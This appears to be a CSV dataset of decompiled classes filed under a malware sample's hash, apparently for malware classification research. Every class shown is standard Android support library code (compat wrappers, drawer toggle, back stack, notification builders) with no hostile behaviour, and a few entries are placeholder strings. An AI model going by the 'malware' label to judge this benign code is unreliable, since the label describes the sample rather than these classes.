"filepath","code"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@49c66ade"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatIcs.code","class AccessibilityServiceInfoCompatIcs {   AccessibilityServiceInfoCompatIcs(){   }   public static boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return info.getCanRetrieveWindowContent();   }   public static String getDescription(  AccessibilityServiceInfo info){     return info.getDescription();   }   public static String getId(  AccessibilityServiceInfo info){     return info.getId();   }   public static ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return info.getResolveInfo();   }   public static String getSettingsActivityName(  AccessibilityServiceInfo info){     return info.getSettingsActivityName();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatJellyBeanMr2.code","class AccessibilityServiceInfoCompatJellyBeanMr2 {   AccessibilityServiceInfoCompatJellyBeanMr2(){   }   public static int getCapabilities(  AccessibilityServiceInfo info){     return info.getCapabilities();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoIcsImpl.code","static class AccessibilityServiceInfoIcsImpl extends AccessibilityServiceInfoStubImpl {   AccessibilityServiceInfoIcsImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getCanRetrieveWindowContent(info);   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getDescription(info);   }   @Override public String getId(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getId(info);   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getResolveInfo(info);   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getSettingsActivityName(info);   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return getCanRetrieveWindowContent(info) ? 1 : 0;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoJellyBeanMr2.code","static class AccessibilityServiceInfoJellyBeanMr2 extends AccessibilityServiceInfoIcsImpl {   AccessibilityServiceInfoJellyBeanMr2(){   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatJellyBeanMr2.getCapabilities(info);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoStubImpl.code","static class AccessibilityServiceInfoStubImpl implements AccessibilityServiceInfoVersionImpl {   AccessibilityServiceInfoStubImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return false;   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return null;   }   @Override public String getId(  AccessibilityServiceInfo info){     return null;   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return null;   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return null;   }   @Override public int getCapabilities(  AccessibilityServiceInfo info){     return 0;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.accessibilityservice\AccessibilityServiceInfoVersionImpl.code","interface AccessibilityServiceInfoVersionImpl {   boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo accessibilityServiceInfo);   int getCapabilities(  AccessibilityServiceInfo accessibilityServiceInfo);   String getDescription(  AccessibilityServiceInfo accessibilityServiceInfo);   String getId(  AccessibilityServiceInfo accessibilityServiceInfo);   ResolveInfo getResolveInfo(  AccessibilityServiceInfo accessibilityServiceInfo);   String getSettingsActivityName(  AccessibilityServiceInfo accessibilityServiceInfo); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Action.code","public static class Action {   public PendingIntent actionIntent;   public int icon;   public CharSequence title;   public Action(  int icon_,  CharSequence title_,  PendingIntent intent_){     this.icon=icon_;     this.title=title_;     this.actionIntent=intent_;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActionBarDrawerToggle.code","public class ActionBarDrawerToggle implements DrawerLayout.DrawerListener {   private static final int ID_HOME=16908332;   private static final ActionBarDrawerToggleImpl IMPL;   private static final float TOGGLE_DRAWABLE_OFFSET=0.33333334f;   private final Activity mActivity;   private final Delegate mActivityImpl;   private final int mCloseDrawerContentDescRes;   private Drawable mDrawerImage;   private final int mDrawerImageResource;   private boolean mDrawerIndicatorEnabled=true;   private final DrawerLayout mDrawerLayout;   private final int mOpenDrawerContentDescRes;   private Object mSetIndicatorInfo;   private SlideDrawable mSlider;   private Drawable mThemeImage; public interface ActionBarDrawerToggleImpl {     Drawable getThemeUpIndicator(    Activity activity);     Object setActionBarDescription(    Object obj,    Activity activity,    int i);     Object setActionBarUpIndicator(    Object obj,    Activity activity,    Drawable drawable,    int i);   } public interface Delegate {     Drawable getThemeUpIndicator();     void setActionBarDescription(    int i);     void setActionBarUpIndicator(    Drawable drawable,    int i);   } public interface DelegateProvider {     Delegate getDrawerToggleDelegate();   } private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplBase(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return null;     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return info;     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return info;     }   } private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {     private ActionBarDrawerToggleImplHC(){     }     @Override public Drawable getThemeUpIndicator(    Activity activity){       return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);     }     @Override public Object setActionBarUpIndicator(    Object info,    Activity activity,    Drawable themeImage,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);     }     @Override public Object setActionBarDescription(    Object info,    Activity activity,    int contentDescRes){       return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 11) {       IMPL=new ActionBarDrawerToggleImplHC();     }  else {       IMPL=new ActionBarDrawerToggleImplBase();     }   }   public ActionBarDrawerToggle(  Activity activity,  DrawerLayout drawerLayout,  int drawerImageRes,  int openDrawerContentDescRes,  int closeDrawerContentDescRes){     this.mActivity=activity;     if (activity instanceof DelegateProvider) {       this.mActivityImpl=((DelegateProvider)activity).getDrawerToggleDelegate();     }  else {       this.mActivityImpl=null;     }     this.mDrawerLayout=drawerLayout;     this.mDrawerImageResource=drawerImageRes;     this.mOpenDrawerContentDescRes=openDrawerContentDescRes;     this.mCloseDrawerContentDescRes=closeDrawerContentDescRes;     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=activity.getResources().getDrawable(drawerImageRes);     this.mSlider=new SlideDrawable(this.mDrawerImage);     this.mSlider.setOffset(TOGGLE_DRAWABLE_OFFSET);   }   public void syncState(){     if (this.mDrawerLayout.isDrawerOpen(GravityCompat.START)) {       this.mSlider.setPosition(1.0f);     }  else {       this.mSlider.setPosition(0.0f);     }     if (this.mDrawerIndicatorEnabled) {       setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);     }   }   public void setDrawerIndicatorEnabled(  boolean enable){     if (enable != this.mDrawerIndicatorEnabled) {       if (enable) {         setActionBarUpIndicator(this.mSlider,this.mDrawerLayout.isDrawerOpen(GravityCompat.START) ? this.mCloseDrawerContentDescRes : this.mOpenDrawerContentDescRes);       }  else {         setActionBarUpIndicator(this.mThemeImage,0);       }       this.mDrawerIndicatorEnabled=enable;     }   }   public boolean isDrawerIndicatorEnabled(){     return this.mDrawerIndicatorEnabled;   }   public void onConfigurationChanged(  Configuration newConfig){     this.mThemeImage=getThemeUpIndicator();     this.mDrawerImage=this.mActivity.getResources().getDrawable(this.mDrawerImageResource);     syncState();   }   public boolean onOptionsItemSelected(  MenuItem item){     if (item != null && item.getItemId() == 16908332 && this.mDrawerIndicatorEnabled) {       if (this.mDrawerLayout.isDrawerVisible(GravityCompat.START)) {         this.mDrawerLayout.closeDrawer(GravityCompat.START);       }  else {         this.mDrawerLayout.openDrawer(GravityCompat.START);       }       return true;     }     return false;   }   @Override public void onDrawerSlide(  View drawerView,  float slideOffset){     float glyphOffset;     float glyphOffset2=this.mSlider.getPosition();     if (slideOffset > 0.5f) {       glyphOffset=Math.max(glyphOffset2,Math.max(0.0f,slideOffset - 0.5f) * 2.0f);     }  else {       glyphOffset=Math.min(glyphOffset2,slideOffset * 2.0f);     }     this.mSlider.setPosition(glyphOffset);   }   @Override public void onDrawerOpened(  View drawerView){     this.mSlider.setPosition(1.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mCloseDrawerContentDescRes);     }   }   @Override public void onDrawerClosed(  View drawerView){     this.mSlider.setPosition(0.0f);     if (this.mDrawerIndicatorEnabled) {       setActionBarDescription(this.mOpenDrawerContentDescRes);     }   }   @Override public void onDrawerStateChanged(  int newState){   }   Drawable getThemeUpIndicator(){     return this.mActivityImpl != null ? this.mActivityImpl.getThemeUpIndicator() : IMPL.getThemeUpIndicator(this.mActivity);   }   void setActionBarUpIndicator(  Drawable upDrawable,  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarUpIndicator(upDrawable,contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarUpIndicator(this.mSetIndicatorInfo,this.mActivity,upDrawable,contentDescRes);     }   }   void setActionBarDescription(  int contentDescRes){     if (this.mActivityImpl != null) {       this.mActivityImpl.setActionBarDescription(contentDescRes);     }  else {       this.mSetIndicatorInfo=IMPL.setActionBarDescription(this.mSetIndicatorInfo,this.mActivity,contentDescRes);     }   } public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {     private final boolean mHasMirroring;     private float mOffset;     private float mPosition;     private final Rect mTmpRect;     private SlideDrawable(    Drawable wrapped){       this.mHasMirroring=Build.VERSION.SDK_INT > 18;       this.mTmpRect=new Rect();       if (DrawableCompat.isAutoMirrored(wrapped)) {         DrawableCompat.setAutoMirrored(this,true);       }       addLevel(0,0,wrapped);     }     public void setPosition(    float position){       this.mPosition=position;       invalidateSelf();     }     public float getPosition(){       return this.mPosition;     }     public void setOffset(    float offset){       this.mOffset=offset;       invalidateSelf();     }     @Override public void draw(    Canvas canvas){       copyBounds(this.mTmpRect);       canvas.save();       boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;       int flipRtl=isLayoutRTL ? -1 : 1;       int width=this.mTmpRect.width();       canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);       if (isLayoutRTL && !this.mHasMirroring) {         canvas.translate(width,0.0f);         canvas.scale(-1.0f,1.0f);       }       super.draw(canvas);       canvas.restore();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActionBarDrawerToggleHoneycomb.code","class ActionBarDrawerToggleHoneycomb {   private static final String TAG=""ActionBarDrawerToggleHoneycomb"";   private static final int[] THEME_ATTRS={R.attr.homeAsUpIndicator};   ActionBarDrawerToggleHoneycomb(){   }   public static Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable drawable,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeAsUpIndicator.invoke(actionBar,drawable);         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set home-as-up indicator via JB-MR2 API"",e);       }     }  else     if (sii.upIndicatorView != null) {       sii.upIndicatorView.setImageDrawable(drawable);     }  else {       Log.w(TAG,""Couldn't set home-as-up indicator"");     }     return info;   }   public static Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     if (info == null) {       info=new SetIndicatorInfo(activity);     }     SetIndicatorInfo sii=(SetIndicatorInfo)info;     if (sii.setHomeAsUpIndicator != null) {       try {         ActionBar actionBar=activity.getActionBar();         sii.setHomeActionContentDescription.invoke(actionBar,Integer.valueOf(contentDescRes));       }  catch (      Exception e) {         Log.w(TAG,""Couldn't set content description via JB-MR2 API"",e);       }     }     return info;   }   public static Drawable getThemeUpIndicator(  Activity activity){     TypedArray a=activity.obtainStyledAttributes(THEME_ATTRS);     Drawable result=a.getDrawable(0);     a.recycle();     return result;   } private static class SetIndicatorInfo {     public Method setHomeActionContentDescription;     public Method setHomeAsUpIndicator;     public ImageView upIndicatorView;     SetIndicatorInfo(    Activity activity){       try {         this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);         this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);       }  catch (      NoSuchMethodException e) {         View home=activity.findViewById(R.id.home);         if (home != null) {           ViewGroup parent=(ViewGroup)home.getParent();           int childCount=parent.getChildCount();           if (childCount == 2) {             View first=parent.getChildAt(0);             View second=parent.getChildAt(1);             View up=first.getId() == 16908332 ? second : first;             if (up instanceof ImageView) {               this.upIndicatorView=(ImageView)up;             }           }         }       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActionBarDrawerToggleImpl.code","public interface ActionBarDrawerToggleImpl {   Drawable getThemeUpIndicator(  Activity activity);   Object setActionBarDescription(  Object obj,  Activity activity,  int i);   Object setActionBarUpIndicator(  Object obj,  Activity activity,  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActionBarDrawerToggleImplBase.code","private static class ActionBarDrawerToggleImplBase implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplBase(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return null;   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return info;   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return info;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActionBarDrawerToggleImplHC.code","private static class ActionBarDrawerToggleImplHC implements ActionBarDrawerToggleImpl {   private ActionBarDrawerToggleImplHC(){   }   @Override public Drawable getThemeUpIndicator(  Activity activity){     return ActionBarDrawerToggleHoneycomb.getThemeUpIndicator(activity);   }   @Override public Object setActionBarUpIndicator(  Object info,  Activity activity,  Drawable themeImage,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarUpIndicator(info,activity,themeImage,contentDescRes);   }   @Override public Object setActionBarDescription(  Object info,  Activity activity,  int contentDescRes){     return ActionBarDrawerToggleHoneycomb.setActionBarDescription(info,activity,contentDescRes);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityCompat.code","public class ActivityCompat extends ContextCompat {   public static boolean invalidateOptionsMenu(  Activity activity){     if (Build.VERSION.SDK_INT < 11) {       return false;     }     ActivityCompatHoneycomb.invalidateOptionsMenu(activity);     return true;   }   public static void startActivity(  Activity activity,  Intent intent,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivity(activity,intent,options);     }  else {       activity.startActivity(intent);     }   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.startActivityForResult(activity,intent,requestCode,options);     }  else {       activity.startActivityForResult(intent,requestCode);     }   }   public static void finishAffinity(  Activity activity){     if (Build.VERSION.SDK_INT >= 16) {       ActivityCompatJB.finishAffinity(activity);     }  else {       activity.finish();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityCompatHoneycomb.code","class ActivityCompatHoneycomb {   ActivityCompatHoneycomb(){   }   public static void invalidateOptionsMenu(  Activity activity){     activity.invalidateOptionsMenu();   }   static void dump(  Activity activity,  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     activity.dump(prefix,fd,writer,args);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityCompatJB.code","class ActivityCompatJB {   ActivityCompatJB(){   }   public static void startActivity(  Context context,  Intent intent,  Bundle options){     context.startActivity(intent,options);   }   public static void startActivityForResult(  Activity activity,  Intent intent,  int requestCode,  Bundle options){     activity.startActivityForResult(intent,requestCode,options);   }   public static void finishAffinity(  Activity activity){     activity.finishAffinity();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityOptionsCompat.code","public class ActivityOptionsCompat {   public static ActivityOptionsCompat makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeCustomAnimation(context,enterResId,exitResId)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight)) : new ActivityOptionsCompat();   }   public static ActivityOptionsCompat makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return Build.VERSION.SDK_INT >= 16 ? new ActivityOptionsImplJB(ActivityOptionsCompatJB.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY)) : new ActivityOptionsCompat();   } private static class ActivityOptionsImplJB extends ActivityOptionsCompat {     private final ActivityOptionsCompatJB mImpl;     ActivityOptionsImplJB(    ActivityOptionsCompatJB impl){       this.mImpl=impl;     }     @Override public Bundle toBundle(){       return this.mImpl.toBundle();     }     @Override public void update(    ActivityOptionsCompat otherOptions){       if (otherOptions instanceof ActivityOptionsImplJB) {         ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;         this.mImpl.update(otherImpl.mImpl);       }     }   }   protected ActivityOptionsCompat(){   }   public Bundle toBundle(){     return null;   }   public void update(  ActivityOptionsCompat otherOptions){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityOptionsCompatJB.code","class ActivityOptionsCompatJB {   private final ActivityOptions mActivityOptions;   public static ActivityOptionsCompatJB makeCustomAnimation(  Context context,  int enterResId,  int exitResId){     return new ActivityOptionsCompatJB(ActivityOptions.makeCustomAnimation(context,enterResId,exitResId));   }   public static ActivityOptionsCompatJB makeScaleUpAnimation(  View source,  int startX,  int startY,  int startWidth,  int startHeight){     return new ActivityOptionsCompatJB(ActivityOptions.makeScaleUpAnimation(source,startX,startY,startWidth,startHeight));   }   public static ActivityOptionsCompatJB makeThumbnailScaleUpAnimation(  View source,  Bitmap thumbnail,  int startX,  int startY){     return new ActivityOptionsCompatJB(ActivityOptions.makeThumbnailScaleUpAnimation(source,thumbnail,startX,startY));   }   private ActivityOptionsCompatJB(  ActivityOptions activityOptions){     this.mActivityOptions=activityOptions;   }   public Bundle toBundle(){     return this.mActivityOptions.toBundle();   }   public void update(  ActivityOptionsCompatJB otherOptions){     this.mActivityOptions.update(otherOptions.mActivityOptions);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ActivityOptionsImplJB.code","private static class ActivityOptionsImplJB extends ActivityOptionsCompat {   private final ActivityOptionsCompatJB mImpl;   ActivityOptionsImplJB(  ActivityOptionsCompatJB impl){     this.mImpl=impl;   }   @Override public Bundle toBundle(){     return this.mImpl.toBundle();   }   @Override public void update(  ActivityOptionsCompat otherOptions){     if (otherOptions instanceof ActivityOptionsImplJB) {       ActivityOptionsImplJB otherImpl=(ActivityOptionsImplJB)otherOptions;       this.mImpl.update(otherImpl.mImpl);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\BackStackEntry.code","public interface BackStackEntry {   CharSequence getBreadCrumbShortTitle();   int getBreadCrumbShortTitleRes();   CharSequence getBreadCrumbTitle();   int getBreadCrumbTitleRes();   int getId();   String getName(); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\BackStackRecord.code","!org.eclipse.jdt.core.dom.TypeDeclaration@559af296"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel in){       return new BackStackState(in);     }     @Override public BackStackState[] newArray(    int size){       return new BackStackState[size];     }   } ;   final int mBreadCrumbShortTitleRes;   final CharSequence mBreadCrumbShortTitleText;   final int mBreadCrumbTitleRes;   final CharSequence mBreadCrumbTitleText;   final int mIndex;   final String mName;   final int[] mOps;   final int mTransition;   final int mTransitionStyle;   public BackStackState(  FragmentManagerImpl fm,  BackStackRecord bse){     int pos;     int numRemoved=0;     for (BackStackRecord.Op op=bse.mHead; op != null; op=op.next) {       if (op.removed != null) {         numRemoved+=op.removed.size();       }     }     this.mOps=new int[(bse.mNumOp * 7) + numRemoved];     if (!bse.mAddToBackStack) {       throw new IllegalStateException(""Not on back stack"");     }     BackStackRecord.Op op2=bse.mHead;     int pos2=0;     while (op2 != null) {       int pos3=pos2 + 1;       this.mOps[pos2]=op2.cmd;       int pos4=pos3 + 1;       this.mOps[pos3]=op2.fragment != null ? op2.fragment.mIndex : -1;       int pos5=pos4 + 1;       this.mOps[pos4]=op2.enterAnim;       int pos6=pos5 + 1;       this.mOps[pos5]=op2.exitAnim;       int pos7=pos6 + 1;       this.mOps[pos6]=op2.popEnterAnim;       int pos8=pos7 + 1;       this.mOps[pos7]=op2.popExitAnim;       if (op2.removed != null) {         int N=op2.removed.size();         this.mOps[pos8]=N;         int i=0;         int pos9=pos8 + 1;         while (i < N) {           this.mOps[pos9]=op2.removed.get(i).mIndex;           i++;           pos9++;         }         pos=pos9;       }  else {         pos=pos8 + 1;         this.mOps[pos8]=0;       }       op2=op2.next;       pos2=pos;     }     this.mTransition=bse.mTransition;     this.mTransitionStyle=bse.mTransitionStyle;     this.mName=bse.mName;     this.mIndex=bse.mIndex;     this.mBreadCrumbTitleRes=bse.mBreadCrumbTitleRes;     this.mBreadCrumbTitleText=bse.mBreadCrumbTitleText;     this.mBreadCrumbShortTitleRes=bse.mBreadCrumbShortTitleRes;     this.mBreadCrumbShortTitleText=bse.mBreadCrumbShortTitleText;   }   public BackStackState(  Parcel in){     this.mOps=in.createIntArray();     this.mTransition=in.readInt();     this.mTransitionStyle=in.readInt();     this.mName=in.readString();     this.mIndex=in.readInt();     this.mBreadCrumbTitleRes=in.readInt();     this.mBreadCrumbTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);     this.mBreadCrumbShortTitleRes=in.readInt();     this.mBreadCrumbShortTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);   }   public BackStackRecord instantiate(  FragmentManagerImpl fm){     BackStackRecord bse=new BackStackRecord(fm);     int pos=0;     int num=0;     while (pos < this.mOps.length) {       BackStackRecord.Op op=new BackStackRecord.Op();       int pos2=pos + 1;       op.cmd=this.mOps[pos];       if (FragmentManagerImpl.DEBUG) {         Log.v(""FragmentManager"",""Instantiate "" + bse + "" op #""+ num+ "" base fragment #""+ this.mOps[pos2]);       }       int pos3=pos2 + 1;       int findex=this.mOps[pos2];       if (findex >= 0) {         Fragment f=fm.mActive.get(findex);         op.fragment=f;       }  else {         op.fragment=null;       }       int pos4=pos3 + 1;       op.enterAnim=this.mOps[pos3];       int pos5=pos4 + 1;       op.exitAnim=this.mOps[pos4];       int pos6=pos5 + 1;       op.popEnterAnim=this.mOps[pos5];       int pos7=pos6 + 1;       op.popExitAnim=this.mOps[pos6];       int pos8=pos7 + 1;       int N=this.mOps[pos7];       if (N > 0) {         op.removed=new ArrayList<>(N);         int i=0;         while (i < N) {           if (FragmentManagerImpl.DEBUG) {             Log.v(""FragmentManager"",""Instantiate "" + bse + "" set remove fragment #""+ this.mOps[pos8]);           }           Fragment r=fm.mActive.get(this.mOps[pos8]);           op.removed.add(r);           i++;           pos8++;         }       }       pos=pos8;       bse.addOp(op);       num++;     }     bse.mTransition=this.mTransition;     bse.mTransitionStyle=this.mTransitionStyle;     bse.mName=this.mName;     bse.mIndex=this.mIndex;     bse.mAddToBackStack=true;     bse.mBreadCrumbTitleRes=this.mBreadCrumbTitleRes;     bse.mBreadCrumbTitleText=this.mBreadCrumbTitleText;     bse.mBreadCrumbShortTitleRes=this.mBreadCrumbShortTitleRes;     bse.mBreadCrumbShortTitleText=this.mBreadCrumbShortTitleText;     bse.bumpBackStackNesting(1);     return bse;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeIntArray(this.mOps);     dest.writeInt(this.mTransition);     dest.writeInt(this.mTransitionStyle);     dest.writeString(this.mName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mBreadCrumbTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbTitleText,dest,0);     dest.writeInt(this.mBreadCrumbShortTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbShortTitleText,dest,0);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\BigPictureStyle.code","public static class BigPictureStyle extends Style {   Bitmap mBigLargeIcon;   boolean mBigLargeIconSet;   Bitmap mPicture;   public BigPictureStyle(){   }   public BigPictureStyle(  Builder builder){     setBuilder(builder);   }   public BigPictureStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigPictureStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigPictureStyle bigPicture(  Bitmap b){     this.mPicture=b;     return this;   }   public BigPictureStyle bigLargeIcon(  Bitmap b){     this.mBigLargeIcon=b;     this.mBigLargeIconSet=true;     return this;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\BigTextStyle.code","public static class BigTextStyle extends Style {   CharSequence mBigText;   public BigTextStyle(){   }   public BigTextStyle(  Builder builder){     setBuilder(builder);   }   public BigTextStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public BigTextStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public BigTextStyle bigText(  CharSequence cs){     this.mBigText=cs;     return this;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Builder.code","public static class Builder {   CharSequence mContentInfo;   PendingIntent mContentIntent;   CharSequence mContentText;   CharSequence mContentTitle;   Context mContext;   PendingIntent mFullScreenIntent;   Bitmap mLargeIcon;   int mNumber;   int mPriority;   int mProgress;   boolean mProgressIndeterminate;   int mProgressMax;   Style mStyle;   CharSequence mSubText;   RemoteViews mTickerView;   boolean mUseChronometer;   ArrayList<Action> mActions=new ArrayList<>();   Notification mNotification=new Notification();   public Builder(  Context context){     this.mContext=context;     this.mNotification.when=System.currentTimeMillis();     this.mNotification.audioStreamType=-1;     this.mPriority=0;   }   public Builder setWhen(  long when){     this.mNotification.when=when;     return this;   }   public Builder setUsesChronometer(  boolean b){     this.mUseChronometer=b;     return this;   }   public Builder setSmallIcon(  int icon){     this.mNotification.icon=icon;     return this;   }   public Builder setSmallIcon(  int icon,  int level){     this.mNotification.icon=icon;     this.mNotification.iconLevel=level;     return this;   }   public Builder setContentTitle(  CharSequence title){     this.mContentTitle=title;     return this;   }   public Builder setContentText(  CharSequence text){     this.mContentText=text;     return this;   }   public Builder setSubText(  CharSequence text){     